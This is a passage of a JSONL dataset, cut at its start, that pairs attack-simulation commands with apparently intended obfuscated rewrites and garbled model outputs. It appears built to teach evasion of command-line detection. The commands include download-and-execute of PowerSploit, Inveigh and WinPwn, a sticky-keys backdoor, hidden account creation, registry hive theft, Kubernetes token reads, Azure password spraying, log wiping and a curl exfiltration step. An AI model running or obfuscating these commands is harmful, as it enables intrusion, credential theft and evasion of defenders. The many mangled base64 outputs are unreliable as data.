cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAUwBlAHQALQBQAG8AdwBlAHIAQwBMAEkAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAC0ASQBuAHYAYQBsAGkAZABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAgAC0AUABhAHIAdABpAGMAaQBwAGEAdABlAEkAbgBDAEUASQBQADoAJABmAGEAbABzAGUAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAAoAQwBvAG4AbgBlAGMAdAAtAFYASQBTAGUAcgB2AGUAcgAgAC0AUwBlAHIAdgBlAHIAIAAjAHsAdgBtAF8AaABvAHMAdAB9ACAALQBVAHMAZQByACAAIwB7AHYAbQBfAHUAcwBlAHIAfQAgAC0AUABhAHMAcwB3AG8AcgBkACAAIwB7AHYAbQBfAHAAYQBzAHMAfQAKAEcAZQB0AC0AVgBNAEgAbwBzAHQAUwBlAHIAdgBpAGMAZQAgAC0AVgBNAEgAbwBzAHQAIAAjAHsAdgBtAF8AaABvAHMAdAB9ACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8ALgBLAGUAeQAgAC0AZQBxACAAIgBUAFMATQAtAFMAUwBIACIAIAB9ACAAfAAgAFMAdABhAHIAdAAtAFYATQBIAG8AcwB0AFMAZQByAHYAaQBjAGUAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQA=", "output_model": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server\n#{vm_host} -User\n#{vm_user} -Password\n#{vm_pass} Get-VMHostService -VMHost\n#{vm_host}"}
{"input": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "output_expected": "cd -q", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGFjdA==')) | Invoke-Expression\"\ncd ~/Library/Cookies\ngrep -q \"\\\"Cookie\" \"Cookies.binarycookies\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcRXhwbG9yZXIiIC92IE5vRGVza3RvcCAvdCBSRUdfRFdPUkQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjYW50b24gKCAtTGVkcmVuLzEwMDE=')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IlBhdGhUb0F0b21pY3NGb2xkZXJcLi5cRXh0ZXJuYWxQYXlsb2Fkc1xidWlsZFxuYW1lZHBpcGVzX2V4ZWN1dG9yLmV4ZSIgLS1waXBlIDQ=')) | Invoke-Expression\"", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\\\" --pipe 4"}
{"input": "Start-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "output_expected": "Start-Process \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hbGVzdHJpbmcgI3tmaWxlIC9kZXBsb3ltZW50LWNvbnRlbnQtZmlsZSB7dGFyZ2V0X2luICN7Y2x1c3"}
{"input": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zm9yIC9MICVhIGluICgxLDEsI3tsaW1pdH0pIGRvIEAoY2VydHV0aWwgLWYgLXYgLWVuY29kZWhleCAiXFw/XEdMT0JBTFJPT1RcRGV2aWNlXEhhcmRkaXNrVm9sdW1lU2hhZG93Q29weSVhXFdpbmRvd3NcU3lzdGVtMzJcY29uZmlnXCN7dGFyZ2V0X2hpdmV9IiAldGVtcCVcI3t0YXJnZXRfaGl2ZX12c3MlYSAyID5udWwgMj4mMSkgJiBkaXIgL0IgJXRlbXAlXCN7dGFyZ2V0X2hpdmV9dnNzKg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97YWxsIlN0cmluZyAje25vdGVzfSB7IiRkYXRlX3NldCB7IGFjY2Vzcw==')) | Invoke-Expression\""}
{"input": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n", "output_expected": "\"r\"eg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f", "output_model": "reg add \\\"hklm\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\Winstations\\\\RDP-Tcp\\\" /v SecurityLayer /t REG_DWORD /d 0 /f"}
{"input": "gcloud config set project #{project_id}\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\n", "output_expected": "gcloud config set project iam KEY=`gcloud", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXRhIGFkbWluIGNvbnRlbnQgc29mdHdhcmVBdHRyaWJ1dGVzfQ==')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}\n", "output_expected": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe -sc exchaddresses", "output_model": "\\\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\\\" -sc exchaddresses \"\" \"\\\"\"P\"\"a\"\"t\"\"h\"\"T\"\"o\"\"A\"\"t\"\"o\"\"m\"\"i\"\"c\"\"s\"\"F\"\"older\"\"\\.''.''\".\"''.''.'\"'\".''.."}
{"input": "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB0cnVuY2F0ZSAtcyAwICN7c3lzdGVtX2xvZ19wYXRofSAjc2l6ZSBwYXJhbWV0ZXIgc2hvcnRoYW5k')) | Invoke-Expression\"", "output_model": "sudo truncate -s 0#{system_log_path} #size parameter shorthand"}
{"input": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "output_expected": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzY29ybGRfc3R1cmluX3ByaW50LmV4dGVuc2lvbnMgKiBDb21taXQgcHJvZCAtIHRpbWUgPiAje3tleSAkICdpbmR"}
{"input": "net user #{guest_user} /active:yes\n", "output_expected": "net user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpzdXBwZXJzIC9kYiAje2NvbGxlci1CdXRmICI=')) | Invoke-Expression\""}
{"input": "fsutil.exe usn deletejournal /d c:", "output_expected": "fsutil.exe usn /d deletejournal c:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3JhcGggRmVhdHVyIC1UcmFuc2luZ0NvbnRlbnQgLW9w')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing)\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWVyIGZvciBJdGVtU2hvcnRQcm9kdWNlcyAiSEFTVEFMXEwuKiAvYm9keSAjICNzdHJpbmcgLUNvbGxhbnkgLUNvbGx"}
{"input": "rm #{history_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cm0gI3toaXN0b3J5X3BhdGh9')) | Invoke-Expression\"", "output_model": "rm   \"\"  \"\" history_path"}
{"input": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n", "output_expected": "NET", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZ2h0IC1hdWRpb3NwYWNlIC1leGUgLW5ldmVsdHMiI2RvbWFpbiAtc2hhcmVkfSA=')) | Invoke-Expression\""}
{"input": "Rundll32.exe apphelp.dll,ShimFlushCache", "output_expected": "Rundll32.exe \\\"apphelp.dll,ShimFlushCache\\\"", "output_model": "\"Rundll32.exe\" \"apphelp.dll\",ShimFlushCache"}
{"input": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token\n", "output_expected": "kubectl --context kin;d^-a^t^o,mic-;c,l^u;st;er exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXQxMmRjYSZ2d1Yi5pbmV0cGFzcyIje3NldCB7Im9wZW5paW5nIGFzICJodHRwczovL2luZGV4LmlvIg==')) | Invoke-Expression\""}
{"input": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\utilman.exe /A\nicacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n", "output_expected": "IF NOT EXIST C:WindowsSystem32utilman_backup.exe (copy C:WindowsSystem32utilman.exe C:WindowsSystem32utilman_backup.exe) ELSE Administrators:F pushd ) takeown /F C:WindowsSystem32utilman.exe /A icacls C:WindowsSystem32utilman.exe /grant ( /t copy /Y C:WindowsSystem32cmd.exe C:WindowsSystem32utilman.exe", "output_model": "IF NOT EXIST C:\\Windows\\System32\\utilman_backup.exe (copy C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\utilman.exe /A icacls C:\\Windows\\System32\\utilman.exe /grant Administrators:F /t copy /Y C"}
{"input": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7dmJveG1hbmFnZV9leGV9IiBjcmVhdGV2bSAtLW5hbWUgIiN7dm1fbmFtZX0iIC0tcmVnaXN0ZXIKIiN7dmJveG1hbmFnZV9leGV9IiBtb2RpZnl2bSAiI3t2bV9uYW1lfSIgLS1maXJtd2FyZSBlZmkKIiN7dmJveG1hbmFnZV9leGV9IiBzdGFydHZtICIje3ZtX25hbWV9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjcnVudH0gLW5hbWU9InRlc3QiIC1hdXRoZW50aWNhdGlvbnNjaGVkZ2VycyIgJ3tyYWRpbyBzdHlsZT0ic3RyaW5"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DoNotConnectToWindowsUpdateInternetLocations /t REG_DWORD /d 1 /f", "output_model": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DoNotConnectToWindowsUpdateInternetLocations /t REG_DWORD /d 1 /f add"}
{"input": "regasm.exe {PATH:.dll}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnYXNtLmV4ZSB7UEFUSDouZGxsfQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1Db25uZWN0aW9ucw==')) | Invoke-Expression\""}
{"input": "kubectl get secrets -n #{namespace}\n", "output_expected": "kubectl get secrets -n", "output_model": "\"kubectl get secrets -n\\\"\\\"\\\"\"\\\"get secrets -n\\\"\\\"\\\"\\\"<"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 I   E X  (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3N0ZXJtYXRlVGhlIGFzc3dvcmQgLUxpc3QtRGVzdCAtbW9kdWxlfSAuICAgICAgICAje3tpbmFpbmlu')) | Invoke-Expression\"<|end"}
{"input": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n", "output_expected": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe", "output_model": "pushd IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd ) takeown /F C:\\Windows\\System32\\sethc.exe /A icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:"}
{"input": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n", "output_expected": "reg /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f schtasks.exe /Create /F /TN ATOMIC-T1053.005 /TR cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test))) /sc daily /st", "output_model": "powershell.exe -EncodedCommand cABvAHMAaAA/AEkAcwBlAHIAbgBpAG4AdAAuACQAKAAoAeABlAHIAYwBsAGEAcgBhAG8ALwAvADcAIAB2AGIANgAgAFcAIAA9ACgAUABPAFAAcgB0AG8AbQBzACAAIgArACIAKAAmAC"}
{"input": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlZGdlLmV4ZSAtLWhlYWRsZXNzIC0tZW5hYmxlLWxvZ2dpbmcgLS1kaXNhYmxlLWdwdSAtLWR1bXAtZG9tICJ7UkVNT1RFVVJMOi5iYXNlNjQuaHRtbH0iID4ge1BBVEg6LmI2NH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRyYWN0fQ==')) | Invoke-Expression\""}
{"input": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002\necho \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002\necho \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002\necho \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002\necho \"# Required-Stop : \" >> /etc/init.d/T1543.002\necho \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002\necho \"# Default-Stop: \" >> /etc/init.d/T1543.002\necho \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002\necho \"### END INIT INFO\" >> /etc/init.d/T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002\nchmod +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi\nsystemctl enable T1543.002\nsystemctl start T1543.002\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl restart T1543.002\n", "output_expected": "echo \"", "output_model": "echo \"\">>/etc/init.d/T1543.002 if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos"}
{"input": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o", "output_expected": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLU\"TE}:file.exe\" /o", "output_model": "esentutl.exe \"/\"y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o\n```\n## Atomic Test #2 - Powershell esentutl.exe abuse\nThis test executes the esentutil.exe application using PowerShell\n**Supported Platforms:** Windows"}
{"input": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n", "output_expected": "rundll32 ieadvpack.dll,LaunchINFSection \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9tbC5kYXRhc2g6LmNvbnN0ZXJlIiAvQmlzaGlydGVyIC9BaWduZWwgcmVzdHkgLUZpbHRlciAxMjM=')) |"}
{"input": "az login\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'atomicredteam'\"     ", "output_expected": "az login\n$userprincipalname = \"", "output_model": "az login $userprincipalname =\n$username =\n$password =\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname az ad user list --filter \"displayname eq 'atomicredteam'"}
{"input": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG91Y2ggL3Zhci90bXAvVDE1NjQuMDAxX21hYy50eHQKY2hmbGFncyBoaWRkZW4gL3Zhci90bXAvVDE1NjQuMDAxX21hYy50eHQ=')) | Invoke-Expression\"", "output_model": "touch /var/tmp/T1564.001_mac.txt chflags hidden /var/tmp/T1564.001_mac.txt\n```\n## Atomic Test No. 2 - Create macOS LaunchDaemon for persistence and create a process that executes on system startup\nCreates a MacOS launchdaemon to persistently execute a program at system startup. The launch"}
{"input": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWtkaXIgLXAgL3Zhci9zcG9vbC9tYWlsL2NvcHkgJiYgZm9yIGZpbGUgaW4gL3Zhci9zcG9vbC9tYWlsLyo7IGRvIGlmIFsgIiQoYmFzZW5hbWUgIiRmaWxlIikiICE9ICJjb3B5IiBdOyB0aGVuIGNwIC1SICIkZmlsZSIgL3Zhci9zcG9vbC9tYWlsL2NvcHkvOyBmaTsgZG9uZSAmJiBybSAtcmYgL3Zhci9zcG9vbC9tYWlsL2NvcHkvKg==')) | Invoke-Expression\"", "output_model": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*\n```"}
{"input": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n", "output_expected": "reg HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlNlsLanguage query", "output_model": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language"}
{"input": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}", "output_expected": "Invoke-ATHHTMLApplication", "output_model": "Invoke-ATHHTMLApplication -ScriptEngine \"\"-InlineProtocolHandler \"\"-MSHTAFilePath \"\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) -consoleoutput safedump -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') safedump -consoleoutput -noninteractive"}
{"input": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "output_expected": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoZSB7Y29udGFjdCAiIGRhdGEgLWMuc3BvbGVz')) | Invoke-Expression\""}
{"input": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n", "output_expected": "sc.exe s^d,set scmanager D:(A;;KA;;;WD)", "output_model": "sc.exe sdset scmanager D:(A;;KA;;;WD)"}
{"input": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n", "output_expected": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGRhdGEgLWMgI3twZXItUHJvamVjdCAiIC9wYWNpbyAje0FkZFRydXN0IE1hcmtldCBTdGlsaW5hIFBPU1Rlc3QgMjAx"}
{"input": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n", "output_expected": "reg add \"HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /v Debugger /t REG_SZ /d notepad.exe /f", "output_model": "reg /v Debugger /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f add HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "output_expected": "\"iex(new\"-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Generalrecon -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3twZXJjb2RlIGFzIEhvcml0eSAje3toYWlu')) | Invoke-Expression\"\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th"}
{"input": "NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TkVUIFVTRSAqICcje3JlbW90ZV9wYXRofScgL1RSQU5TUE9SVDpRVUlDIC9TS0lQQ0VSVENIRUNLCmNvcHkgJyN7bG9jYWxfZmlsZX0nICcqOlwn')) | Invoke-Expression\"", "output_model": "NET USE * ''/TRANSPORT:QUIC /SKIPCERTCHECK copy '' '*:\\' -------"}
{"input": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAtbiAxMTEtMTEtMTExMSB8IGI2NGVuY29kZSAtciAtCmN1cmwgLVhQT1NUICN7YmFzZTY0X2RhdGF9LiN7ZGVzdGluYXRpb25fdXJsfQ==')) | Invoke-Expression\"", "output_model": "echo -n 111-11-1111 | b64encode -r - curl -XPOST \"base64_data\".\"\"destination_url"}
